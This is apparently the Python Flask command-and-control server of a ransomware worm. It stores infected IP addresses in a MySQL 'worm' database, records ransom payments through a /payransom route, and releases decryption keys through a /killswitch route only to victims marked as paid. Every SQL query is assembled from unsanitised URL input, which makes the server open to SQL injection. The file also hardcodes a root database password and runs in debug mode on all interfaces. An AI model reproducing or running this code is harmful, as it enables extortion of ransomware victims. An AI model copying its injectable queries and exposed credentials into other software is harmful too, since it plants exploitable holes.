from flask import Flask
import mysql.connector
import RSA_decryption as RSA

app = Flask(__name__)

@app.route('/checkIp/<ip>')
def checkIp(ip):
    mydb1 = mysql.connector.connect(
        host = '127.0.0.1',
        user = 'root',
        password = 'tooR@#12',
        auth_plugin='mysql_native_password',
        database = 'worm'
        )
    mycursor= mydb1.cursor()
    cmd = 'select * from ips where ips=\''+ip+'\';'
    mycursor.execute(cmd)
    for x in mycursor:
        if x != None:
            return {'status':True}
    #returs True if it is infected...
    #inserts into table if not
    cmd = 'insert into ips(ips,ransome) values(\''+ip+'\', False);'
    mycursor.execute(cmd)
    mydb1.commit()
    mycursor.close()
    mydb1.close()
    return {'status':False}

@app.route('/killswitch/<ip>/<cipher>')
def kill(ip,cipher):
    mydb = mysql.connector.connect(
        host = '127.0.0.1',
        user = 'root',
        password = 'tooR@#12',
        auth_plugin='mysql_native_password',
        database = 'worm'
        )
    mycursor= mydb.cursor()
    cmd = 'select ransome from ips where ips=\''+ip+'\';'
    mycursor.execute(cmd)
    try:
        data = mycursor.fetchone()
    except:
        return {'status':'Fuck off','keys':0}
    if(data[0]):
        keys = RSA.d_main(cipher)
        status='success'
    else:
        status='Fuck off'
        keys = 0
    mycursor.close()
    mydb.close()
    return {'status':status,'keys':keys}

@app.route('/payransom/<ip>')
def payransom(ip):
    mydb = mysql.connector.connect(
        host = '127.0.0.1',
        user = 'root',
        password = 'tooR@#12',
        auth_plugin='mysql_native_password',
        database = 'worm'
        )
    mycursor= mydb.cursor()
    cmd = 'update ips set ransome = True where ips = \''+ip+'\';'
    mycursor.execute(cmd)
    mydb.commit()
    mycursor.close()
    mydb.close()
    return {'status':'done'}
if __name__ == '__main__':
   mydb = mysql.connector.connect(
        host = '127.0.0.1',
        user = 'root',
        password = 'tooR@#12',
        auth_plugin='mysql_native_password',
        database = 'worm'
        )
   mycursor= mydb.cursor()
   mycursor.execute('DELETE FROM ips;')
   mydb.commit()
   mycursor.close()
   mydb.close()
   app.run(host='0.0.0.0',debug = True)
